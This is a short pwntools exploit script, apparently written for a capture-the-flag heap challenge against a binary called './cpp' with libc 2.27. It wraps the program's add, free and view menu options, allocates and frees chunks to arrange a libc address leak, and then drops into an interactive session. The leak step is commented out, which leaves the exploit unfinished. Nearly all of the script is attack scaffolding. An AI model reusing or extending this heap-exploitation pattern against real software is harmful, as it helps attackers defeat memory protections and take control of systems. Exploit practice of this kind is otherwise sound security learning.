#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./cpp")
libc = ELF("./libc-2.27.so")
context.binary = exe
context.terminal = "wt.exe -- wsl.exe -d Ubuntu-20.04 -- ".split()
#context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"
context.aslr = False

global io
breakpoints = '''
break *0x555555401353
continue
'''+"continue\n"*1

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path,gdbscript=breakpoints)
    
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def add(name,buf):
    sla("Choice: ", "1")
    sla("name: ", name)
    sla("buf: ", buf)

def free(idx):
    sla("Choice: ", "2")
    sla("idx: ", str(idx))

def view(idx):
    sla("Choice: ", "3")
    sla("idx: ", str(idx))

add("A"*8, "B"*8)        #0
add("C"*0x500, "D"*8)    #1
add("E"*8, "F"*8)        #2
add("G"*8, "H"*8)        #3
add("I"*8, "J"*8)        #4

free(4)
free(3)
free(2)
free(1)
'''
view(0)
libc.address = unpack(re(6),48)
log.info("Libc -> "+hex(libc.address))
'''
io.interactive()